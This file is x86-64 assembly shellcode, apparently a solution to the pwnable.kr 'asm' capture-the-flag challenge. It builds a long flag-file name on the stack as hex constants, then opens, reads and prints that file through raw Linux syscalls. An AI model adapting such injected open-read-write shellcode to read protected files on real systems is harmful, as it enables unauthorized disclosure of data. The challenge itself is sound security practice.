.section .text
  .globl _start

/*
* The following comments is quote from Stack Overflow.
* url; https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-i39
*
*
* User-level applications use as integer registers for passing the sequence
* %rdi, %rsi, %rdx, %rcx, %r8 and %r9.
* The kernel interface uses %rdi, %rsi, %rdx, %r10, %r8 and %r9.
*
*
* In x86-32 parameters for Linux system call are passed using registers.
* %eax for syscall_number. %ebx, %ecx, %edx, %esi, %edi, %ebp
* are used for passing 6 parameters to system calls.
*/


/*
* Quote from unistd_64.h
#define __NR_read 0$
#define __NR_write 1$
#define __NR_open 2
*/

  _start:
    xor %rax, %rax
    xor %rdi, %rdi
    xor %rsi, %rsi
    xor %rdx, %rdx
   
    #movq $0x306F306F306F6E00, %rax
    #movq $0x006E6F306F306F30, %rax

    movq $0x00676E6F306F306F, %rax
    push %rax
    movq $0x306F306F306F306F, %rax
    push %rax
    movq $0x3030303030303030, %rax
    push %rax
    movq $0x303030306F6F6F6F, %rax
    push %rax
    movq $0x6F6F6F6F6F6F6F6F, %rax
    push %rax
    movq $0x6F6F6F6F6F6F6F6F, %rax
    push %rax
    movq $0x6F6F6F3030303030, %rax
    push %rax
    movq $0x3030303030303030, %rax
    push %rax
    movq $0x3030303030303030, %rax
    push %rax
    movq $0x303030306F6F6F6F, %rax
    push %rax
    movq $0x6F6F6F6F6F6F6F6F, %rax
    push %rax
    movq $0x6F6F6F6F6F6F6F6F, %rax
    push %rax
    movq $0x6F6F6F6F6F6F6F6F, %rax
    push %rax
    movq $0x6F6F6F6F6F6F6F6F, %rax
    push %rax
    movq $0x6F6F6F6F6F6F6F6F, %rax
    push %rax
    movq $0x6F6F6F6F6F6F6F6F, %rax
    push %rax
    movq $0x6F6F6F6F6F6F6F6F, %rax
    push %rax
    movq $0x6F6F6F6F6F6F6F6F, %rax
    push %rax
    movq $0x6F6F6F6F6F6F6F6F, %rax
    push %rax
    movq $0x6C5F797265765F73, %rax
    push %rax
    movq $0x695F656D616E5F65, %rax
    push %rax
    movq $0x6C69665F6568745F, %rax
    push %rax
    movq $0x7972726F732E656C, %rax
    push %rax
    movq $0x69665F736968745F, %rax
    push %rax
    movq $0x646165725F657361, %rax
    push %rax
    movq $0x656C705F656C6966, %rax
    push %rax
    movq $0x5F67616C665F726B, %rax
    push %rax
    movq $0x2E656C62616E7770, %rax
    push %rax
    movq $0x5F73695F73696874, %rax
    push %rax

    movq %rax, %rax
    movq $0x2, %rax # system call number
    movq %rsp, %rdi
    movq $0x0, %rsi # flag is O_RDONLY
    movq $0x0, %rdx
    syscall # or int $0x80
    movq %rax, %rbx
    popq %rax

    xor %rax, %rax # system call number
    movq %rbx, %rdi
    sub $0x200, %rsp
    movq %rsp, %rsi # buffer
    movq $0x200, %rdx
    syscall
    
    movq $0x1, %rdi
    movq $0x1, %rax
    movq $0x100, %rdx
    #movq %rsp, %rsi
    syscall
    ret


